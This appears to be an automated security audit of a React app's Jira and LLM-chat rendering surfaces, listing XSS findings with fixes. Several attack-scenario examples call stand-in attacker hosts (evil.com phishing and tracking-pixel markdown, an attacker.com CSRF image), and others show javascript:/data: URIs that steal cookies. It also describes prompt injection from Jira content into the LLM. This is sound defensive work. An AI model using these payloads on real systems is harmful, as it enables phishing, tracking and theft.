# XSS & Content Rendering Audit

**Auditor**: Security audit (automated)
**Date**: 2026-05-07
**Scope**: All content rendering surfaces, markdown processing, ADF handling, dynamic link generation, DOM injection vectors
**Threat model reference**: `docs/security/threat-model.md` (T1, T9, T11)

---

## Executive Summary

The codebase has a **moderately secure** content rendering posture. React's default JSX escaping prevents the most common XSS vectors, and `react-markdown` v9.1.0's `defaultUrlTransform` blocks `javascript:` URIs by default -- correcting a key assumption in the threat model (T11). However, several findings require remediation, particularly around ADF-to-markdown injection, missing `rehype-sanitize`, uncontrolled avatar image URLs, and link rendering without `target`/`rel` safety attributes.

**Critical**: 0
**High**: 2
**Medium**: 4
**Low**: 3

---

## Finding 1: ADF-to-Markdown Injection via Crafted Jira Content

| Field | Value |
|-------|-------|
| **Severity** | High |
| **Threat model ref** | T1 (XSS via Markdown Rendering) |
| **File:line** | `packages/app/src/components/board/CardDetail.tsx:284-298` |
| **Also at** | `packages/app/src/routes/issue.$issueKey.chat.tsx:21-33` |

### Description

The `extractText()` function walks ADF (Atlassian Document Format) trees and concatenates all text nodes, then passes the result to `ReactMarkdown` for rendering. ADF text nodes can contain arbitrary strings -- including markdown syntax. An attacker who controls a Jira issue description or comment can craft an ADF document whose text nodes, when concatenated, form valid markdown that renders as unintended HTML.

### Attack scenario

An attacker creates a Jira comment with the following ADF structure:

```json
{
  "type": "doc",
  "content": [
    {
      "type": "paragraph",
      "content": [
        { "type": "text", "text": "[Click here](https://evil.com/phish) " },
        { "type": "text", "text": "![](https://evil.com/tracking-pixel.gif)" }
      ]
    }
  ]
}
```

When `extractText()` processes this, it produces the string:
```
[Click here](https://evil.com/phish) ![](https://evil.com/tracking-pixel.gif)
```

`ReactMarkdown` then renders this as a clickable link to a phishing site and an invisible tracking pixel. More critically, crafted ADF can produce markdown that injects arbitrary formatted content, impersonating the UI or misleading users.

The same vulnerability exists when the extracted text is injected into the LLM system prompt (line `issue.$issueKey.chat.tsx:181`), enabling both UI spoofing and prompt injection (see T3).

### Affected rendering sites

1. `CardDetail.tsx:277` -- `DescriptionRenderer` passes `extractText()` output to `ReactMarkdown`
2. `CardDetail.tsx:249` -- Comment bodies go through the same `DescriptionRenderer`
3. `issue.$issueKey.chat.tsx:57` and `:181` -- Description text extracted for system prompt and context panel display

### Recommended fix

- Do **not** pass ADF-extracted text through `ReactMarkdown`. ADF content that has been reduced to plain text should be rendered as plain text (`<pre>` or `<p>` with `whitespace-pre-wrap`), not re-interpreted as markdown.
- Alternatively, build a proper ADF renderer that maps ADF node types to safe React components, preserving structure without going through a markdown intermediate representation.

```tsx
// Safe: render extracted text as plain text, not markdown
function DescriptionRenderer({ content }: { content: unknown }) {
  const text = extractText(content);
  return <p className="whitespace-pre-wrap text-sm">{text}</p>;
}
```

---

## Finding 2: No `rehype-sanitize` in ReactMarkdown Pipeline

| Field | Value |
|-------|-------|
| **Severity** | High |
| **Threat model ref** | T1 (XSS via Markdown Rendering), T11 (Unvalidated Markdown Links) |
| **File:line** | `packages/app/src/components/chat/MessageList.tsx:105-112` |
| **Also at** | `packages/app/src/components/board/CardDetail.tsx:277-279` |

### Description

Both `ReactMarkdown` usage sites configure only `remarkGfm` as a plugin. Neither uses `rehype-sanitize` to constrain the set of allowed HTML elements and attributes. While `react-markdown` v9.1.0 does **not** render raw HTML by default (and its `defaultUrlTransform` blocks `javascript:` URIs), the lack of `rehype-sanitize` means:

1. **Future regression risk**: If anyone adds `rehypeRaw` (to support HTML in markdown), all XSS protections vanish instantly. There is no defense-in-depth layer.
2. **GFM autolink edge cases**: `remarkGfm` adds autolink support. While the default URL transform filters protocols, complex edge cases in URL parsing could bypass it (e.g., URL-encoded `javascript:` in certain contexts).
3. **No element allowlist**: Without `rehype-sanitize`, the set of rendered elements is the full markdown spec. This includes `<img>` tags (via `![](url)`) that can trigger requests to attacker-controlled servers (tracking pixels, CSRF via GET).

### Attack scenario

LLM responses (which are attacker-influenceable via prompt injection from Jira content) can include:
```markdown
![](https://attacker.com/csrf?action=delete&id=123)
```
This renders as an invisible image tag that fires a GET request to the attacker's server.

### Recommended fix

Add `rehype-sanitize` with a strict schema:

```tsx
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';

const sanitizeSchema = {
  ...defaultSchema,
  attributes: {
    ...defaultSchema.attributes,
    // Strip all event handlers, only allow safe attributes
  },
  tagNames: [
    'p', 'a', 'strong', 'em', 'code', 'pre', 'blockquote',
    'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'table', 'thead', 'tbody', 'tr', 'th', 'td', 'br', 'hr',
  ],
  // Explicitly exclude: img, iframe, script, style, object, embed
};

<ReactMarkdown
  remarkPlugins={[remarkGfm]}
  rehypePlugins={[[rehypeSanitize, sanitizeSchema]]}
>
```

Note: `rehype-sanitize` is not currently a dependency. It must be added to `package.json`.

---

## Finding 3: Markdown-Rendered Links Lack `target="_blank"` and `rel="noopener noreferrer"`

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Threat model ref** | T11 (Unvalidated Markdown Links) |
| **File:line** | `packages/app/src/components/chat/MessageList.tsx:105-112` |
| **Also at** | `packages/app/src/components/board/CardDetail.tsx:277-279` |

### Description

Both `ReactMarkdown` usage sites do not provide a custom `a` component override. Links in LLM responses and Jira descriptions render as plain `<a href="...">` without:
- `target="_blank"` -- clicking a link navigates the SPA away, losing unsaved state
- `rel="noopener noreferrer"` -- the linked page can access `window.opener` (reverse tabnabbing)

By contrast, the static links in `SourceControl.tsx:164-165` and `settings.tsx:318-319` correctly include both attributes.

### Attack scenario

1. LLM response contains `[Important Update](https://attacker.com)`.
2. User clicks the link. The current page navigates to `attacker.com`.
3. The attacker page has access to `window.opener` and can redirect the opener to a phishing page.
4. User returns to find what looks like a re-authentication prompt.

### Recommended fix

Add a custom `a` component to both `ReactMarkdown` instances:

```tsx
components={{
  code: CodeBlock,
  a: ({ href, children, ...props }) => (
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer"
      {...props}
    >
      {children}
    </a>
  ),
}}
```

---

## Finding 4: Unvalidated Avatar Image URLs from Jira API

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Threat model ref** | T1 (XSS via content rendering) |
| **File:line** | `packages/app/src/components/board/CardDetail.tsx:94` |
| **Also at** | `CardDetail.tsx:237`, `Card.tsx:102` |

### Description

Avatar URLs from Jira (`issue.fields.assignee.avatarUrls['24x24']` and `comment.author.avatarUrls['16x16']`) are rendered directly in `<img src={...}>` tags without validation. While Jira normally returns `https://*.atlassian.net/` URLs, a compromised or malicious Jira instance could return:

1. URLs to attacker-controlled servers (user tracking, IP disclosure)
2. `data:` URIs with SVG payloads (though modern browsers restrict script execution in `<img>` contexts)
3. Extremely large `data:` URIs causing memory exhaustion

### Attack scenario

A compromised Jira Cloud instance (or a self-hosted Jira with modified avatar URLs) returns:
```json
{
  "avatarUrls": {
    "24x24": "https://attacker.com/track?user=victim&board=PROJ"
  }
}
```

Every time the board renders, the browser makes a request to the attacker's server, disclosing the user's IP and the board they're viewing.

### Recommended fix

Validate that avatar URLs match expected Jira CDN patterns:

```ts
function sanitizeAvatarUrl(url: string): string {
  try {
    const parsed = new URL(url);
    if (parsed.hostname.endsWith('.atlassian.net') ||
        parsed.hostname.endsWith('.jira.com')) {
      return url;
    }
  } catch { /* invalid URL */ }
  return ''; // fallback to no image or placeholder
}
```

---

## Finding 5: PR URL Rendered as Link Without Origin Validation

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Threat model ref** | T1 (Content injection) |
| **File:line** | `packages/app/src/components/ide/SourceControl.tsx:162-169` |

### Description

The `lastPRUrl` state variable is set from the return value of `onCreatePR()`, which calls `github.createPullRequest()`, which returns `data.html_url` from the GitHub API response. This URL is then rendered as a clickable `<a href={lastPRUrl}>`. While GitHub API responses are generally trustworthy, the URL is not validated to ensure it points to `github.com`.

If the GitHub API response were tampered with (e.g., via a man-in-the-middle on the SW relay, or a future custom git provider integration), the link could point to a phishing site.

The link does correctly use `target="_blank" rel="noopener noreferrer"`, which mitigates reverse tabnabbing.

### Recommended fix

Validate that the PR URL matches the expected GitHub origin:

```ts
function isGitHubUrl(url: string): boolean {
  try {
    return new URL(url).hostname === 'github.com';
  } catch {
    return false;
  }
}
```

---

## Finding 6: Tool Result Content Rendered as Plain Text in `<pre>` (Safe, but Note)

| Field | Value |
|-------|-------|
| **Severity** | Low (Informational) |
| **Threat model ref** | T1 (Content rendering) |
| **File:line** | `packages/app/src/components/chat/ToolResult.tsx:70-78` |

### Description

Tool call results are rendered inside a `<pre>` element using React's JSX text interpolation (`{toolResult.content}`). This is safe because React escapes text content in JSX by default. The `toolCall.arguments` are serialized via `JSON.stringify()` (line 62), which is also safe.

No vulnerability found -- this is a positive note confirming the implementation is secure for this surface.

---

## Finding 7: Error Messages Rendered from LLM Provider Responses

| Field | Value |
|-------|-------|
| **Severity** | Low |
| **Threat model ref** | T1 (Content injection) |
| **File:line** | `packages/app/src/components/chat/MessageList.tsx:125-139` |
| **Also at** | `components/ide/SourceControl.tsx:142-145`, `components/chat/ProviderPicker.tsx:349` |

### Description

Error messages from LLM providers (e.g., `chunk.error`, `err.message`) are rendered as text content in the DOM. These are rendered via JSX text interpolation (e.g., `{message.error}`, `{testError}`), which React escapes automatically. However, error messages originating from external APIs are user-visible and could contain misleading content.

A malicious LLM endpoint (custom provider) could return error messages designed to social-engineer the user:

```
Error: Your session has expired. Please re-enter your API key at https://phishing.com
```

This is rendered as plain text (no clickable link), so the risk is limited to social engineering without direct exploitation.

### Recommended fix

Consider truncating error messages to a maximum length and stripping URLs:

```ts
function sanitizeErrorMessage(msg: string, maxLen = 200): string {
  return msg.slice(0, maxLen).replace(/https?:\/\/\S+/g, '[URL removed]');
}
```

---

## Finding 8: `extractText()` Does Not Handle ADF `marks` (Link Marks Ignored)

| Field | Value |
|-------|-------|
| **Severity** | Medium |
| **Threat model ref** | T1 (Content rendering) |
| **File:line** | `packages/app/src/components/board/CardDetail.tsx:284-298` |

### Description

ADF text nodes can have `marks` that describe formatting, including `link` marks that contain `href` attributes. The current `extractText()` function only reads `text` and recursively processes `content` -- it completely ignores `marks`. This means:

1. **Link URLs from ADF are silently dropped** -- legitimate links in Jira descriptions are lost.
2. **More importantly**, if `marks` handling is added in the future without sanitization, an attacker could inject arbitrary URLs (including `javascript:` URIs) through ADF link marks.

Example ADF with a link mark:
```json
{
  "type": "text",
  "text": "Click here",
  "marks": [
    {
      "type": "link",
      "attrs": {
        "href": "javascript:alert(document.cookie)"
      }
    }
  ]
}
```

Currently safe because marks are ignored, but this is a latent vulnerability that will manifest if `extractText()` is enhanced.

### Recommended fix

If ADF mark handling is added, link marks must validate URLs against a safe protocol allowlist (`https:`, `http:`, `mailto:`) before rendering.

---

## Finding 9: Threat Model T11 Overstates `javascript:` URI Risk

| Field | Value |
|-------|-------|
| **Severity** | Low (Informational -- threat model correction) |
| **Threat model ref** | T11 (Unvalidated Markdown Links) |
| **File:line** | `node_modules/react-markdown/lib/index.js:113,416-438` |

### Description

The threat model (T11) states:

> `react-markdown` v9+ defaults to allowing `javascript:` in href if not explicitly filtered

This is **incorrect**. Inspection of the installed `react-markdown` v9.1.0 shows that the `defaultUrlTransform` function (line 416-438) implements protocol validation. The `safeProtocol` regex on line 113 is:

```js
const safeProtocol = /^(https?|ircs?|mailto|xmpp)$/i
```

Any URL with a protocol not in this allowlist (including `javascript:`, `data:`, `vbscript:`) is replaced with an empty string. This means:

- `[Click](javascript:alert(1))` renders as a link with an empty `href`
- `[Click](data:text/html,<script>alert(1)</script>)` is also blocked

**However**, this protection has caveats:
- It can be bypassed by passing `urlTransform={null}` to disable the transform
- It does not apply to images rendered via `![](url)` for all protocols
- URL encoding edge cases could potentially bypass the regex in future versions

The threat model's residual risk should be downgraded from "High" to "Low" for the current version, with a note that it depends on the `defaultUrlTransform` not being overridden.

---

## Surfaces Audited and Confirmed Safe

The following content rendering surfaces were audited and found to be safe:

| Surface | File | Rendering method | Safe? |
|---------|------|-------------------|-------|
| User chat messages | `MessageList.tsx:102` | JSX text in `<p>` | Yes -- React escapes |
| Issue key, summary | `Card.tsx:62,74` | JSX text in `<span>`, `<p>` | Yes -- React escapes |
| Status, priority, type badges | `CardDetail.tsx:58-69` | JSX text in `<Badge>` | Yes -- React escapes |
| Assignee displayName | `CardDetail.tsx:98` | JSX text in `<span>` | Yes -- React escapes |
| Reporter displayName | `CardDetail.tsx:103` | JSX text | Yes -- React escapes |
| Component names | `CardDetail.tsx:113-116` | JSX text in `<Badge>` | Yes -- React escapes |
| Labels | `CardDetail.tsx:118-121` | JSX text in `<Badge>` | Yes -- React escapes |
| Linked issue summaries | `CardDetail.tsx:175` | JSX text in `<span>` | Yes -- React escapes |
| Comment author names | `CardDetail.tsx:241` | JSX text in `<span>` | Yes -- React escapes |
| Subtask summaries | `CardDetail.tsx:210` | JSX text in `<span>` | Yes -- React escapes |
| Column names | `Column.tsx:29` | JSX text in `<h2>` | Yes -- React escapes |
| Filter dropdown options | `FilterBar.tsx:83-119` | JSX text in `<DropdownMenuItem>` | Yes -- React escapes |
| Transition field names | `TransitionModal.tsx:146` | JSX text in `<label>` | Yes -- React escapes |
| Toast title/description | `Toaster.tsx:59-63` | JSX text in `<p>` | Yes -- React escapes |
| Error boundary messages | `ErrorBoundary.tsx:47` | JSX text in `<p>` | Yes -- React escapes |
| Auth callback error | `auth.callback.tsx:94` | JSX text in `<p>` | Yes -- React escapes |
| Tool call arguments | `ToolResult.tsx:62` | `JSON.stringify()` in `<pre>` | Yes -- safe serialization |
| Tool result content | `ToolResult.tsx:77` | JSX text in `<pre>` | Yes -- React escapes |
| Commit SHA | `SourceControl.tsx:153` | JSX text in `<code>` | Yes -- React escapes |
| File change paths | `SourceControl.tsx:204` | JSX text in `<span>` | Yes -- React escapes |
| Command palette labels | `CommandPalette.tsx:237` | JSX text in `<span>` | Yes -- static commands |
| Monaco editor content | `MonacoEditor.tsx` | Text model (not HTML) | Yes -- plain text rendering |
| `document.title` | `issue.$issueKey.chat.tsx:145` | `document.title` assignment | Yes -- title is not HTML-parsed |

## Surfaces Confirmed Absent

| Vector | Status |
|--------|--------|
| `dangerouslySetInnerHTML` | **Not used** anywhere in application code (only in a test assertion) |
| `eval()` / `new Function()` | **Not used** in application code |
| `iframe` / `srcdoc` | **Not used** |
| `document.write()` / `insertAdjacentHTML()` | **Not used** |
| `innerHTML` assignment | **Not used** in application code (only in test) |
| `rehypeRaw` | **Not imported** -- raw HTML passthrough is disabled |
| Custom `urlTransform` override | **Not used** -- default safe transform is active |

---

## Consolidated Recommendations (Priority Order)

### P1 -- Fix before production use

1. **Add `rehype-sanitize`** to both `ReactMarkdown` instances (`MessageList.tsx`, `CardDetail.tsx`) with an element allowlist that excludes `img`, `iframe`, `script`, `style`, `object`, `embed`. This provides defense-in-depth against future regressions. (Addresses Findings 2)

2. **Stop piping ADF-extracted text through ReactMarkdown**. Either render it as plain text, or build a dedicated ADF-to-React renderer that maps ADF node types to safe components. (Addresses Finding 1)

3. **Add custom link component** to `ReactMarkdown` that enforces `target="_blank"` and `rel="noopener noreferrer"` on all rendered links. (Addresses Finding 3)

### P2 -- Fix in next iteration

4. **Validate avatar URLs** against expected Jira CDN hostnames before rendering in `<img src>`. (Addresses Finding 4)

5. **Validate PR URLs** against `github.com` origin before rendering as clickable links. (Addresses Finding 5)

6. **Update threat model T11** to reflect that `react-markdown` v9.1.0 does filter `javascript:` URIs by default via `defaultUrlTransform`. Downgrade residual risk from "High" to "Low" with a caveat about version pinning. (Addresses Finding 9)

### P3 -- Track for future

7. **Sanitize error messages** from external APIs to prevent social engineering via crafted error text. (Addresses Finding 7)

8. **Document the security constraint** that `extractText()` must never be enhanced to handle ADF `marks` without URL sanitization. (Addresses Finding 8)
